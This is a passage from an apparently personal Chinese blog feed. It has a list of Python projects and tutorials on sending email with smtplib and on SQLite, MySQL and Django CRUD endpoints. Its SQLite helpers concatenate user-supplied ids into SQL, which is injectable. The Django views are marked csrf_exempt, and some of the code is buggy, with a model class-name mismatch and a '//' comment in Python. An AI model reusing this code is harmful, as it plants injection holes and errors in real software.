<p><strong>十、邮件与聊天</strong></p>
<ul>
<li><a href="https://github.com/martinrusev/mailbox">mailbox</a>：Mailbox 是对 Python 的 IMAP 一个人性化的再造。 基于简单即是美的态度，作者对 IMAP 接口给出了一个简单又好理解的形式。</li>
<li><a href="https://github.com/jeztek/deadchat">deadchat</a>：deadchat 旨在不安全的网络环境中提供安全的单一房间群聊服务以及客户端。</li>
<li><a href="https://github.com/pagekite/Mailpile">Mailpile</a>：Mailpile 是针对邮件的索引及搜索引擎 。</li>
</ul>
<p><strong>十一、音频和视频</strong></p>
<ul>
<li><a href="https://github.com/np1/pms">pms</a>：穷人的 <a href="https://www.spotify.com/">Spotify</a>，搜索和收集音乐流!</li>
<li><a href="https://github.com/worldveil/dejavu">dejavu</a>：在琢磨 Shazam 的原理? 音频指纹识别算法的 Python 实现在此!（译注:<a href="http://www.shazam.com/">Shazam</a>：是个神奇的音乐识别应用，对她啍个几秒调子，就能精确告诉你是什么歌曲、作者、歌词……）</li>
<li><a href="https://github.com/styxit/HTPC-Manager">HTPC-Manager</a>：为 <a href="http://en.wikipedia.org/wiki/Home_theater_PC">HTPC</a> 粉丝准备的工具，提供了完备的界面来管理所有家庭媒体服务器上的好物。</li>
<li><a href="http://fomori.org/cherrymusic/">cherrymusic</a>：Python 实现的一个音乐流媒体服务器。 流化输出你的音乐到所有设备上。</li>
<li><a href="http://zulko.github.io/moviepy/">moviepy</a>：脚本化的电影剪辑包，切&#x2F;串&#x2F;插入标题等基本操作，几行就搞定!</li>
</ul>
<p><strong>十二、其它</strong></p>
<ul>
<li><a href="https://github.com/BrianHicks/emit">emit</a>：用 redis 为你的函式追加可订阅能力，很有趣。</li>
<li><a href="https://github.com/quantopian/zipline">zipline</a>：Zipline 是种很 Pythonic 的交易算法库。</li>
<li><a href="http://raspberry.io/">raspberry.io</a>：Raspberry.io 是树莓派的社区实现。 刚刚发布，汇集了各种创意想法，有兴趣的话立即检出折腾吧。</li>
<li><a href="https://github.com/samuelclay/NewsBlur">NewsBlur</a>：Google Reader 已经关张儿了，Newsblur 已经发布了有段日子了，开源的 RSS 阅读器，这绝对是应该首先体验的。</li>
<li><a href="https://github.com/lihaoyi/macropy">macropy</a>：Macropy 是在 Python 中实现 <a href="http://en.wikipedia.org/wiki/Macro_%28computer_science%29">macros</a> 的库。 检出文档，参考所有功能，看怎么用上了。<br><a href="https://github.com/halst/mini">- mini</a>：对编译器以及语言设计有兴趣的，一定要看看这个仓库，以及配套的录像!</li>
<li><a href="https://github.com/erikrose/parsimonious">parsimonious</a>：Parsimonious 的目标是最快的 arbitrary-lookahead 解析器。 用 Python 实现，基本可用。</li>
<li><a href="https://github.com/posativ/isso">isso</a>：Disqus 的开源替代，从 demo 看很不错，而且提供了更好的隐私设置。</li>
<li><a href="https://github.com/deaddrop/deaddrop">deaddrop</a>：Deaddrop 能为新闻机构或是其它人提供在线投递箱，详细信息参考其 <a href="http://deaddrop.github.io/">github page</a>。</li>
<li><a href="https://github.com/hhatto/nude.py">nude.py</a>：裸体检测的 Python 实现，是 node.js 的仿制。</li>
<li><a href="https://github.com/emre/kaptan">kaptan</a>： Kaptan 是你应用的配置管理器！</li>
<li><a href="https://github.com/spotify/luigi">luigi</a>：Luigi 帮你构建复杂的管道来完成批处理。</li>
<li><a href="https://github.com/waawal/gramme">gramme</a>：Gramme 以简单而优雅的方式，通过 UDP 接口对易失数据完成消息包装序列化。</li>
<li><a href="https://github.com/zestyping/q">q</a>：为你的 Python 程序提供快速而随性的日志。 有一系列帮手来追踪你的函式参数，并能在控制台快速交互式加载。</li>
<li><a href="https://github.com/zedshaw/fuqit">fuqit</a>：来自伟大的 <a href="http://twitter.com/zedshaw">Zed Shaw</a> 最新作品，fuqit 试图令你忘记 MVC 的经验，用全新的方式专注简洁一切。</li>
<li><a href="https://github.com/pydanny/simplicity">simplicity</a>：基于靠谱的 <a href="http://twitter.com/pydanny">pydanny</a> 将你的新结构化文本转换为 JSON 格式。</li>
<li><a href="https://github.com/michaelhelmick/lassie">lassie</a>：Lassie 允许你轻松的从网站检索出内容来。</li>
<li><a href="https://github.com/jflesch/paperwork">paperwork</a>：Paperwork 是个 OCR 文档并完成可搜索转化的工具，用 GTK&#x2F;Glade 实现了友好的界面。</li>
<li><a href="https://github.com/chrisallenlane/cheat">cheat</a>：cheat 允许你创建并查阅命令行上的交互式备忘。设计目的是帮助 *nix 的系统管理员们在习惯的环境中，快速调阅不易记忆的常用命令。</li>
<li><a href="https://github.com/audreyr/cookiecutter">cookiecutter</a>：良心模块! 提供一堆有用但是不常写，所以记不下来的代码模板，也支持自制代码模板。</li>
<li><a href="https://github.com/isnowfy/pydown">pydown</a>：支持用 Python 构建亮丽的 HTML5 效果幻灯，<a href="http://isnowfy.github.io/pydown/">Demo</a>。<br><a href="https://github.com/scottrice/Ice">Ice</a>：模拟器粉丝们现在能用 Ice 向 <a href="http://store.steampowered.com/">Steam</a> 里塞 ROM 来玩了。</li>
<li><a href="https://github.com/ecdavis/pants">pants</a>：用以编写异步网络应用的轻量级框架。 Pants 是单线程，回调服务，也包含支持 Websockets 的 HTTP 服务、WSGI 支持和一个简单的 web 框架。</li>
<li><a href="https://github.com/asperous/pipeless">pipeless</a>：Pipeless 是一个构建简单 <a href="http://en.wikipedia.org/wiki/Pipeline_%28software%29">数据管道</a>的框架。</li>
<li><a href="https://github.com/sloria/marshmallow">marshmallow</a>：marshmallow 是个 ORM 无关的库，能将复杂的数据类型转换为 Python 原生类型对象，以便容易的转换为 JSON 提供接口使用。</li>
<li><a href="https://github.com/Ceasar/twosheds/">twosheds</a>：Python 实现的库，用来构造命令或是 shell 解释器。Twosheds 让你用 Python 来定制自个儿的 shell 环境。</li>
</ul>
<p>来自：<a href="http://www.cnblogs.com/hongfei/p/3874419.html">http://www.cnblogs.com/hongfei/p/3874419.html</a></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python发送邮件</title>
    <url>/aposts/2e455102/</url>
    <content><![CDATA[<p>直接上代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from email.header import Header</span><br><span class="line">from email.mime.text import MIMEText</span><br><span class="line">from email.utils import parseaddr, formataddr</span><br><span class="line">from email.mime.multipart import MIMEMultipart</span><br><span class="line">from email.mime.application import MIMEApplication</span><br><span class="line">import smtplib</span><br><span class="line"># 第三方 SMTP 服务</span><br><span class="line">mail_host=&quot;smtp.qq.com&quot;  #设置服务器</span><br><span class="line">mail_user=&quot;111@qq.com&quot;    #用户名</span><br><span class="line">mail_pass=&quot;adfafda&quot;   #口令</span><br><span class="line"></span><br><span class="line">def _format_addr(s):</span><br><span class="line">    name, addr = parseaddr(s)</span><br><span class="line">    return formataddr((Header(name, &#x27;utf-8&#x27;).encode(), addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def send_mail(f, to_addr):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">    :param f: 附件路径</span><br><span class="line">    :param to_addr:发给的人 []</span><br><span class="line">    :return:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    from_addr = mail_user</span><br><span class="line">    password = mail_pass</span><br><span class="line">    # to_addr = &quot;ashikun@126.com&quot;</span><br><span class="line">    smtp_server = mail_host</span><br><span class="line"></span><br><span class="line">    msg = MIMEMultipart()</span><br><span class="line"></span><br><span class="line">    # msg = MIMEText(&#x27;hello, send by Python...&#x27;, &#x27;plain&#x27;, &#x27;utf-8&#x27;)</span><br><span class="line">    msg[&#x27;From&#x27;] = _format_addr(&#x27;坤少发的邮件&lt;%s&gt;&#x27; % from_addr)</span><br><span class="line">    msg[&#x27;To&#x27;] = _format_addr(&#x27;大人 &lt;%s&gt;&#x27; % to_addr)</span><br><span class="line">    msg[&#x27;Subject&#x27;] = Header(&#x27;接口测试报告……&#x27;, &#x27;utf-8&#x27;).encode()</span><br><span class="line"></span><br><span class="line">    msg.attach(MIMEText(&#x27;接口测试报告.&#x27;, &#x27;plain&#x27;, &#x27;utf-8&#x27;))</span><br><span class="line">    part = MIMEApplication(open(f, &#x27;rb&#x27;).read())</span><br><span class="line">    part.add_header(&#x27;Content-Disposition&#x27;, &#x27;attachment&#x27;, filename=f)</span><br><span class="line">    msg.attach(part)</span><br><span class="line"></span><br><span class="line">    server = smtplib.SMTP_SSL(smtp_server, 465)</span><br><span class="line">    server.set_debuglevel(1)</span><br><span class="line">    server.login(from_addr, password)</span><br><span class="line">    server.sendmail(from_addr, to_addr, msg.as_string())</span><br><span class="line">    server.quit()</span><br></pre></td></tr></table></figure>

<ul>
<li>被这里密码坑了好长时间，切记这里的密码不是登陆密码，而是授权码</li>
<li>QQ发邮件用25端口发送不成功，用搞定ssl的465</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python操作sqlite和mysql</title>
    <url>/aposts/25867e8/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>本机环境，python3.7 ,win10 64</p>
<h2 id="操作sqlite"><a href="#操作sqlite" class="headerlink" title="操作sqlite"></a>操作sqlite</h2><ul>
<li><p>新建一个空的后缀名文件sample.db</p>
</li>
<li><p>代码</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import sqlite3</span><br><span class="line"></span><br><span class="line">#打开数据库</span><br><span class="line">def open_db():</span><br><span class="line">    #创建SQLite数据库</span><br><span class="line">    con=sqlite3.connect(r&quot;D:\project\pythonSql\sample.db&quot;)</span><br><span class="line">    #创建表book:包含3列，id(主键，学号),name,tel</span><br><span class="line">    # con.execute(&quot;create table if not exists book(id primary key,name,tel)&quot;)</span><br><span class="line">    con.execute(&quot;create table if not exists book(id INTEGER PRIMARY KEY, name TEXT, tel TEXT, timer TEXT);&quot;)</span><br><span class="line"></span><br><span class="line">    #创建游标对象</span><br><span class="line">    cur=con.cursor()</span><br><span class="line">    # 涉及到修改，删除等入库的操作必须用con.commit()提交事务最终完成</span><br><span class="line">    # cur 主要是进行查询</span><br><span class="line">    return con,cur</span><br><span class="line"></span><br><span class="line">#查询全部信息</span><br><span class="line">def show_all_db():</span><br><span class="line">    print(&quot;******通讯录现有数据******&quot;)</span><br><span class="line">    cur_1=open_db()[1]</span><br><span class="line">    cur_1.execute(&quot;select id,name,tel from book&quot;)</span><br><span class="line">    for row in cur_1:</span><br><span class="line">        print(row)</span><br><span class="line">        print(row[0])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#向数据库中添加内容</span><br><span class="line">def add_db(name,tel):</span><br><span class="line">    print(&quot;******数据添加功能******&quot;)</span><br><span class="line">    cur_1=open_db()</span><br><span class="line">    # cur_1[1].execute(&quot;insert into book(id,name,tel) values(?,?,?)&quot;,(id,name,tel))</span><br><span class="line">    cur_1[1].execute(&quot;insert into book(name,tel) values(?,?)&quot;,(name,tel))</span><br><span class="line">    cur_1[0].commit()</span><br><span class="line">    print(&quot;******数据添加成功******&quot;)</span><br><span class="line"></span><br><span class="line">#删除数据库中的内容</span><br><span class="line">def delete_db(del_id):</span><br><span class="line">    print(&quot;******数据删除功能******&quot;)</span><br><span class="line">    cur_1=open_db()</span><br><span class="line">    cur_1[1].execute(&quot;delete from book where id=&quot;+del_id)</span><br><span class="line">    cur_1[0].commit()</span><br><span class="line">    print(&quot;******数据删除成功******&quot;)</span><br><span class="line">    show_all_db()</span><br><span class="line">    #关闭游标对象</span><br><span class="line">    cur_1[1].close()</span><br><span class="line"></span><br><span class="line">#修改数据库中的内容</span><br><span class="line">def alter_db(id,name,tel):</span><br><span class="line">    print(&quot;******数据修改功能******&quot;)</span><br><span class="line">    cur_1=open_db()</span><br><span class="line">    #更新数据使用 SQL 语句中的 update</span><br><span class="line">    cur_1[1].execute(&quot;update book set name = ? ,tel = ? where id =&quot;+id,(name,tel))</span><br><span class="line">    #游标事务提交</span><br><span class="line">    cur_1[0].commit()</span><br><span class="line">    show_all_db()</span><br><span class="line">    cur_1[1].close()</span><br><span class="line"></span><br><span class="line">#查询数据</span><br><span class="line">def query_data(id):</span><br><span class="line"></span><br><span class="line">    print(&quot;******数据查询功能******&quot;)</span><br><span class="line">    cur_1=open_db()</span><br><span class="line">    cur_1[1].execute(&quot;select id,name,tel from book where id =&quot;+id)</span><br><span class="line">    print(&quot;******查询结果如下******&quot;)</span><br><span class="line">    for row in cur_1[1]:</span><br><span class="line">        print(row)</span><br><span class="line">    cur_1[1].close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    # add_db(&quot;你好&quot;, &quot;185111&quot;)</span><br><span class="line">    # show_all_db()</span><br><span class="line">    # query_data(&quot;1&quot;)</span><br><span class="line">    # alter_db(&quot;1&quot;, &quot;我好&quot;, &quot;hehe&quot;)</span><br><span class="line">    # query_data(&quot;1&quot;)</span><br><span class="line">    # delete_db(&quot;1&quot;)</span><br><span class="line">    show_all_db()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>使用工具打开<a href="https://www.yunqa.de/delphi/news/2022-07-06_sqlitespy">sqlitespy</a>打开sqlite文件</li>
</ul>
<p><img src="/aposts/25867e8/image-20221209174201531.png" alt="image-20221209174201531"></p>
<h2 id="操作mysql"><a href="#操作mysql" class="headerlink" title="操作mysql"></a>操作mysql</h2><ul>
<li>本地搭建的mysql环境，省略</li>
<li>使用<a href="https://www.heidisql.com/download.php">HeidiSQL</a>，连接数据库，创建表</li>
</ul>
<p><img src="/aposts/25867e8/image-20221209174414824.png" alt="image-20221209174414824"></p>
<ul>
<li>设置自增主键</li>
</ul>
<p><img src="/aposts/25867e8/image-20221209174525798.png" alt="image-20221209174525798"></p>
<ul>
<li>操作代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import pymysql</span><br><span class="line"></span><br><span class="line">dbinfo = &#123;</span><br><span class="line">    &quot;host&quot;:&quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;user&quot;:&quot;root&quot;,</span><br><span class="line">    &quot;password&quot;:&quot;123456&quot;,</span><br><span class="line">    &quot;port&quot;:3306</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class DB:</span><br><span class="line">    def __init__(self,dbinfo):</span><br><span class="line">        # self.db 只要修改表，必须用self.db.commit()进行事务提交，如果报错可以用self.db.rollback()进行回滚</span><br><span class="line">        self.db = pymysql.connect(cursorclass = pymysql.cursors.DictCursor,</span><br><span class="line">                                  **dbinfo)</span><br><span class="line">        # self.cursor 用来查询</span><br><span class="line">        self.cursor = self.db.cursor()</span><br><span class="line"></span><br><span class="line">    def select(self,sql):</span><br><span class="line">        self.cursor.execute(sql)</span><br><span class="line">        result = self.cursor.fetchall()</span><br><span class="line">        return result</span><br><span class="line"></span><br><span class="line">    def execute(self,sql):</span><br><span class="line"></span><br><span class="line">        self.cursor.execute(sql)</span><br><span class="line">        self.db.commit()</span><br><span class="line"></span><br><span class="line">        #     self.db.rollback()</span><br><span class="line">        # try:</span><br><span class="line">        #     self.cursor.execute(sql)</span><br><span class="line">        #     self.db.commit()</span><br><span class="line">        # except:</span><br><span class="line">        #     self.db.rollback()</span><br><span class="line"></span><br><span class="line">    def close(self):</span><br><span class="line">        self.cursor.close()</span><br><span class="line">        self.db.close()</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    db = DB(dbinfo)</span><br><span class="line">    #查询</span><br><span class="line">    sql = &quot;SELECT * from test.class&quot;</span><br><span class="line">    result = db.select(sql)</span><br><span class="line">    print(result)</span><br><span class="line"></span><br><span class="line">    #新增</span><br><span class="line">    # sql2 = &quot;INSERT into test.class(name) VALUES (&#x27;五年一班&#x27;)&quot;</span><br><span class="line">    # db.execute(sql2)</span><br><span class="line">    # sql = &quot;SELECT * from test.class&quot;</span><br><span class="line">    # result = db.select(sql)</span><br><span class="line">    # print(result)</span><br><span class="line"></span><br><span class="line">    # 修改</span><br><span class="line">    # sql2 = &quot;update test.class set name=&#x27;综艺一般&#x27; where id=6&quot;</span><br><span class="line">    # db.execute(sql2)</span><br><span class="line">    # sql = &quot;SELECT * from test.class&quot;</span><br><span class="line">    # result = db.select(sql)</span><br><span class="line">    # print(result)</span><br><span class="line"></span><br><span class="line">    # # 删除</span><br><span class="line">    # sql2 = &quot;delete from test.class where id=5&quot;</span><br><span class="line">    # db.execute(sql2)</span><br><span class="line">    # sql = &quot;SELECT * from test.class&quot;</span><br><span class="line">    # result = db.select(sql)</span><br><span class="line">    # print(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Django-mysql"><a href="#Django-mysql" class="headerlink" title="Django mysql"></a>Django mysql</h2><ul>
<li><p>django安装<code>pip install Django</code></p>
</li>
<li><p>创建项目及应用</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建应用</span><br><span class="line">D:\project&gt;django-admin startproject pysql</span><br><span class="line">D:\project&gt;cd pysql</span><br><span class="line"># 创建应用下的一个项目</span><br><span class="line">D:\project\mysite&gt; python manage.py startapp myapi</span><br></pre></td></tr></table></figure>

<ul>
<li>django 配置</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pysql\pysql\setting.py</span><br><span class="line">import pymysql</span><br><span class="line">pymysql.version_info = (1, 4, 13, &quot;final&quot;, 0) #指定版本</span><br><span class="line">pymysql.install_as_MySQLdb()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">INSTALLED_APPS = [</span><br><span class="line">    &#x27;django.contrib.admin&#x27;,</span><br><span class="line">    &#x27;django.contrib.auth&#x27;,</span><br><span class="line">    &#x27;django.contrib.contenttypes&#x27;,</span><br><span class="line">    &#x27;django.contrib.sessions&#x27;,</span><br><span class="line">    &#x27;django.contrib.messages&#x27;,</span><br><span class="line">    &#x27;django.contrib.staticfiles&#x27;,</span><br><span class="line">    &#x27;myapi&#x27; # 注册应用</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 设置默认数据库为mysql</span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,</span><br><span class="line">        &#x27;NAME&#x27;: &#x27;test&#x27;,  # 数据库名字</span><br><span class="line">        &#x27;USER&#x27;: &#x27;root&#x27;,  # 帐号</span><br><span class="line">        &#x27;PASSWORD&#x27;: &#x27;123456&#x27;,  # 密码</span><br><span class="line">        &#x27;HOST&#x27;: &#x27;127.0.0.1&#x27;,  # IP</span><br><span class="line">        &#x27;PORT&#x27;: &#x27;3306&#x27;,  # 端口</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>设置model中的表字段</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pysql\myapi\model.py</span><br><span class="line">from django.db import models</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class class1(models.Model):</span><br><span class="line">    id = models.IntegerField().primary_key</span><br><span class="line">    name = models.CharField(max_length=128, unique=True)</span><br><span class="line">    tel = models.CharField(max_length=256)</span><br><span class="line">    c_time = models.DateTimeField(auto_now_add=True)</span><br><span class="line"></span><br><span class="line">    def __str__(self):</span><br><span class="line">        return self.name</span><br></pre></td></tr></table></figure>

<ul>
<li>让model中的表结构在数据库中生成</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations # 让model生效</span><br><span class="line">python manage.py migrate # 生成表</span><br></pre></td></tr></table></figure>

<ul>
<li>编写views中代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pysql/myapi/views.py</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">from django.core.exceptions import ObjectDoesNotExist</span><br><span class="line">from django.http import JsonResponse</span><br><span class="line">from django.views.decorators.csrf import csrf_exempt</span><br><span class="line"></span><br><span class="line">from myapi.models import *</span><br><span class="line"></span><br><span class="line">def query_all(request):</span><br><span class="line">    res = Class1.objects.all()</span><br><span class="line">    resp = []</span><br><span class="line">    for i in res:</span><br><span class="line">        resp.append(&#123;&quot;id&quot;: i.id, &quot;name&quot;: i.name, &quot;tel&quot;: i.tel&#125;)</span><br><span class="line">    return JsonResponse(&#123;&quot;code&quot;: 1, &quot;msg&quot;: &quot;success&quot;, &quot;data&quot;: resp&#125;)</span><br><span class="line"></span><br><span class="line">@csrf_exempt</span><br><span class="line">def delete(request):</span><br><span class="line">    data = json.loads(request.body)</span><br><span class="line">    id = data.get(&quot;id&quot;)</span><br><span class="line">    if not id:</span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: -1, &quot;msg&quot;: &quot;id must be fill&quot;&#125;)</span><br><span class="line">    try:</span><br><span class="line">        entry = Class1.objects.get(id=id)</span><br><span class="line">        if not entry:</span><br><span class="line">            return JsonResponse(&#123;&quot;code&quot;: -1, &quot;msg&quot;: &quot;no effect row&quot;&#125;)</span><br><span class="line">        entry.delete()</span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: 1, &quot;msg&quot;: &quot;success&quot;&#125;)</span><br><span class="line"></span><br><span class="line">    except ObjectDoesNotExist:</span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: -1, &quot;msg&quot;: &quot;no effect row&quot;&#125;)</span><br><span class="line"></span><br><span class="line">@csrf_exempt</span><br><span class="line">def update(request):</span><br><span class="line">    data = json.loads(request.body)</span><br><span class="line">    name = data.get(&#x27;name&#x27;).strip()</span><br><span class="line">    tel = data.get(&#x27;tel&#x27;).strip()</span><br><span class="line">    ids = data.get(&quot;id&quot;)</span><br><span class="line">    if not name and not ids:</span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: -1, &quot;msg&quot;: &quot;error&quot;&#125;)</span><br><span class="line">    try:</span><br><span class="line">        entry = Class1.objects.get(id=ids)</span><br><span class="line">        if not entry:</span><br><span class="line">            return JsonResponse(&#123;&quot;code&quot;: -1, &quot;msg&quot;: &quot;no effect row&quot;&#125;)</span><br><span class="line">        entry.tel = tel</span><br><span class="line">        entry.name = name</span><br><span class="line">        entry.save()</span><br><span class="line"></span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: 1, &quot;msg&quot;: &quot;success&quot;&#125;)</span><br><span class="line"></span><br><span class="line">    except ObjectDoesNotExist:</span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: -1, &quot;msg&quot;: &quot;no effect row&quot;&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_class(request, id):</span><br><span class="line">    try:</span><br><span class="line">        # entry = Class1.objects.filter(id=id)</span><br><span class="line">        entry = Class1.objects.get(id=id)</span><br><span class="line">        if not entry:</span><br><span class="line">            result = &#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;data is null&#x27;&#125;</span><br><span class="line">            return JsonResponse(result)</span><br><span class="line">        return JsonResponse(&#123;&quot;code&quot;: 1, &quot;msg&quot;: &quot;success&quot;, &quot;data&quot;: &#123;&quot;name&quot;: entry.name, &quot;tel&quot;: entry.tel&#125;&#125;)</span><br><span class="line"></span><br><span class="line">    except ObjectDoesNotExist:</span><br><span class="line">        result = &#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;no effect row&#x27;&#125;</span><br><span class="line">        return JsonResponse(result)</span><br><span class="line"></span><br><span class="line">@csrf_exempt</span><br><span class="line">def add(request):</span><br><span class="line">    data = json.loads(request.body)</span><br><span class="line">    name = data.get(&quot;name&quot;)</span><br><span class="line">    tel = data.get(&quot;tel&quot;)</span><br><span class="line">    if not name or not tel:</span><br><span class="line">        res = &#123;&#x27;code&#x27;: -1, &#x27;msg&#x27;: &#x27;name,tel must be fill&#x27;&#125;</span><br><span class="line">        return JsonResponse(res)</span><br><span class="line">    Class1(name=name, tel=tel).save()</span><br><span class="line">    res = &#123;&#x27;code&#x27;: 1, &#x27;msg&#x27;: &#x27;success&#x27;&#125;</span><br><span class="line">    return JsonResponse(res)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>把views中的对外接口引用到url中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pysql/myapi/urls.py</span><br><span class="line"></span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from django.urls import path</span><br><span class="line">from myapi import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^query_all/&#x27;, views.query_all),</span><br><span class="line">    url(r&#x27;^delete/&#x27;, views.delete),</span><br><span class="line">    url(r&#x27;^update/&#x27;, views.update),</span><br><span class="line">    url(r&#x27;^add/&#x27;, views.add),</span><br><span class="line">    path(&#x27;get_class/&lt;int:id&gt;/&#x27;, views.get_class)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>把myapi应用的路由url引用到pysql项目中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#pysql/pysql/urls.py</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from django.urls import path</span><br><span class="line"></span><br><span class="line">from myapi import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^query_all/&#x27;, views.query_all),</span><br><span class="line">    url(r&#x27;^delete/&#x27;, views.delete),</span><br><span class="line">    url(r&#x27;^update/&#x27;, views.update),</span><br><span class="line">    url(r&#x27;^add/&#x27;, views.add),</span><br><span class="line">    path(&#x27;get_class/&lt;int:id&gt;/&#x27;, views.get_class)</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>运行Django</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project\pysql&gt;python manage.py runserver</span><br><span class="line">Watching for file changes with StatReloader</span><br><span class="line">Performing system checks...</span><br><span class="line"></span><br><span class="line">System check identified no issues (0 silenced).</span><br><span class="line">December 09, 2022 - 19:15:56</span><br><span class="line">Django version 3.1.3, using settings &#x27;pysql.settings&#x27;</span><br><span class="line">Starting development server at http://127.0.0.1:8000/</span><br><span class="line">Quit the server with CTRL-BREAK.</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>模拟前端访问后台接口代码</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp = requests.post(&quot;http://127.0.0.1:8000/myapi/add/&quot;, json=&#123;&quot;name&quot;: &quot;admin1&quot;, &quot;tel&quot;: &quot;123456&quot;&#125;)</span><br><span class="line">print(resp.text)</span><br><span class="line">resp1 = requests.post(&quot;http://127.0.0.1:8000/myapi/update/&quot;, json=&#123;&quot;id&quot;: 1,&quot;name&quot;: &quot;test&quot;, &quot;tel&quot;: &quot;7999&quot;&#125;)</span><br><span class="line">print(resp1.text)</span><br><span class="line">resp2= requests.post(&quot;http://127.0.0.1:8000/myapi/update/&quot;, json=&#123;&quot;id&quot;: 1,&quot;name&quot;: &quot;test&quot;, &quot;tel&quot;: &quot;1111&quot;&#125;)</span><br><span class="line">print(resp2.text)</span><br><span class="line">resp3 = requests.post(&quot;http://127.0.0.1:8000/myapi/delete/&quot;, json=&#123;&quot;id&quot;: 1&#125;)</span><br><span class="line">print(resp3.text)</span><br><span class="line"></span><br><span class="line">resp4 = requests.get(&quot;http://127.0.0.1:8000/myapi/get_class/1/&quot;)</span><br><span class="line">print(resp4.text)</span><br><span class="line"></span><br><span class="line">resp4 = requests.get(&quot;http://127.0.0.1:8000/myapi/query_all&quot;)</span><br><span class="line">print(resp4.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>得到结果为：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\app\Python37\python.exe D:/project/pysql/test1.py</span><br><span class="line">&#123;&quot;code&quot;: 1, &quot;msg&quot;: &quot;success&quot;, &quot;data&quot;: [&#123;&quot;id&quot;: 5, &quot;name&quot;: &quot;admin1&quot;, &quot;tel&quot;: &quot;123456&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Django-sqlite"><a href="#Django-sqlite" class="headerlink" title="Django sqlite"></a>Django sqlite</h2><ul>
<li>由于接入mysql，配置已经改的差不多，只要修改，setting.py的默认数据库引用</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># pysql/pysql/setting.py</span><br><span class="line"></span><br><span class="line">DATABASES = &#123;</span><br><span class="line">    &#x27;default&#x27;: &#123;</span><br><span class="line">        &#x27;ENGINE&#x27;: &#x27;django.db.backends.sqlite3&#x27;,</span><br><span class="line">        &#x27;NAME&#x27;: BASE_DIR / &#x27;db.sqlite3&#x27;,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>在pysql文件夹下新建一个空文件<code>db.sqlite3</code></li>
<li>让model的结构迁移到sqlite3数据库中</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python manage.py makemigrations # 让model生效</span><br><span class="line">python manage.py migrate # 生成表</span><br></pre></td></tr></table></figure>

<ul>
<li>再次运行django</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\project\pysql&gt;python manage.py runserver</span><br></pre></td></tr></table></figure>

<ul>
<li>模拟前端访问后台接口代码</li>
</ul>
